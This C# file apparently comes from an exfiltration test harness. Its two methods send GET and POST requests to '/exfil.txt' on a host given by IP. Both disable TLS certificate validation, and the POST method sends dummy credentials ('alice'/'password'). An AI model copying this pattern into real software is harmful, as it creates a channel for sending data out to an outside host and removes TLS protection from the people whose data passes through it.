using System.Text;
using System.Net;
using System.Text.Json;

namespace httpclient2
{
    public class Program
    {
        public static void webreqget(string ip, string isSSL)
        {
            string url = "";

            if (isSSL == "Yes")
                url = "https://" + ip + "/exfil.txt";
            else
                url = "http://" + ip + "/exfil.txt";

            Console.WriteLine("Using WebRequest in CHash");

            //ignore the invalid SSl cert error
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            var request = WebRequest.Create(url);
            request.Method = "GET";

            using var webResponse = request.GetResponse();
            using var webStream = webResponse.GetResponseStream();

            using var reader = new StreamReader(webStream);
            var data = reader.ReadToEnd();

            Console.WriteLine(data);
        }

        public static void webreqpost(string ip, string isSSL)
        {
            string url = "";

            if (isSSL == "Yes")
                url = "https://" + ip + "/exfil.txt";
            else
                url = "http://" + ip + "/exfil.txt";

            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            var request = WebRequest.Create(url);
            request.Method = "POST";

            string data = "Username=alice&&Password=password";
            byte[] byteArray = Encoding.UTF8.GetBytes(data);

            Console.WriteLine("Using WebRequest in CHash");

            request.ContentType = "application/x-www-form-urlencoded";
            request.ContentLength = byteArray.Length;

            using var reqStream = request.GetRequestStream();
            reqStream.Write(byteArray, 0, byteArray.Length);

            using var response = request.GetResponse();
            Console.WriteLine(((HttpWebResponse)response).StatusDescription);

            using var respStream = response.GetResponseStream();

            using var reader = new StreamReader(respStream);
            string read = reader.ReadToEnd();
            Console.WriteLine(read);
        }
    }
}